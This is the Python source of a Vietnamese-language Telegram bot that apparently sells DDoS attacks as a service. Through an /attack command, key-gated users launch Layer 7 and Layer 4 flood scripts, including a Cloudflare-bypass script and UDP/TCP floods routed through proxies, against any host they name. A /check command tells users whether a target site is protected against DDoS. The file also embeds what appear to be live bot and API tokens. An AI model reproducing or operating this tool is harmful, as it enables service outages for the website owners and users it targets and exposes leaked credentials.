import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6488196768:AAFqQpEYQeimlC4NNBChxgB0YjtPRbb3TC0'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1001943835802

allowed_users = []
processes = []
ADMIN_ID = 6334990098
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi Dành Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nhập Đúng Định Dạng /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Đã Thêm Người Dùng Có ID Là: {user_id} Sử Dụng Lệnh 30 Ngày')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Vui Lòng Chờ...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://web1s.com/api?token=02111506-4571-4103-89ba-d66203d759c0&url=https://anhgit.site/key?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "Lấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "FLấy Key Lỗi Vui Lòng Sử Dụng Lại Lệnh /getkey"
    
    text = f'''
- Cảm Ơn Bạn Đã Getkey -
- Link Lấy Key Hôm Nay Là: {url_key}
- Nhập Key Bằng Lệnh /key + [key] -
 [Lưu ý: mỗi key chỉ có 1 người dùng]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui Lòng Nhập Key\nVí Dụ /key gioiddos79667\nSử Dụng Lệnh /getkey Để Lấy Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nhập Key Thành Công')
    else:
        bot.reply_to(message, 'Key Sai Hoặc Hết Hạn\nKhông Sử Dụng Key Của Người Khác!')


@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
📌 Tất Cả Các Lệnh:
- /getkey : Để lấy key
- /key + [Key] : Kích Hoạt Key
- /attack + [methods] + [host]
- /methods : Để Xem Methods
- /proxy : Check Số Lượng Proxy
- /time : Số Thời Gian Bot Hoạt Động
5️⃣ Info Admin
- /muakey : Để Mua Key VIP
- /admin : Info Admin
- /on : On Bot
- /off : Off Bot
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tất Cả Methods:
🚀 Layer7
XAU-TRAI
DEP-TRAI - C2
HTTPS - C@.01
PRO : LUXUR8
[ BY NEWH2R7HJK]
[]
🚀 Layer4
TCP-OPEN
UDP-CHAOS
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 120:
                cmd_process.terminate()
                bot.reply_to(message, "DONE!!!")
                return
        # Check if the attack duration has beesn reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='/getkey')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, '/attack + [methods] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(20 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-CHAOS', 'TCP-OPEN'] and len(args) < 4:
        bot.reply_to(message, f'/attack [methods] [ip] [port]')
        return

    if method in ['UDP-CHAOS', 'TCP-OPEN']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn",".gov"]   
    if method == 'XAU-TRAI' or method == 'DEP-TRAI' or method == 'HTTPS' or method == 'PRO':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['XAU-TRAI', 'PRO', 'DEP-TRAI', 'HTTPS', 'UDP-CHAOS', 'TCP-OPEN']:
        # Update the command and duration based on the selected method
        if method == 'XAU-TRAI':
            command = ["node", "TLS.js", host, "120", "64", "10"]
            duration = 120
        elif method == 'PRO':
            command = ["node", "GOD.js", host, "120", "64", "7"]
            duration = 120
        elif method == 'DEP-TRAI':
            command = ["node", "DESTROY.js", host, "200", "64", "20", "proxy.txt"]
            duration = 200
        elif method == 'HTTPS':
            command = ["node", "CFBYPASS.js", host, "120", "64", "15", "proxy.txt"]
            duration = 120
        elif method == 'UDP-CHAOS':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'TCP-OPEN':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃ SENT ATTACK\n┗━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━┓\n┣By: @{username} \n┣Host:{host} \n┣Methods: {method} \n┣Time: {duration}s\n┣➤ Owner @newh2r7hjk\n┗━━━━━━━━━━━━━━')
    else:
        bot.reply_to(message, 'USE COMMAND /methods')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới update là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không antiddos."
        else:
            reply += "Website có nhiều hơn 1 ip khả năng antiddos rất cao.\nKhông thể tấn công website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/newh2r7hjk")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 1000
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='use /getkey')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
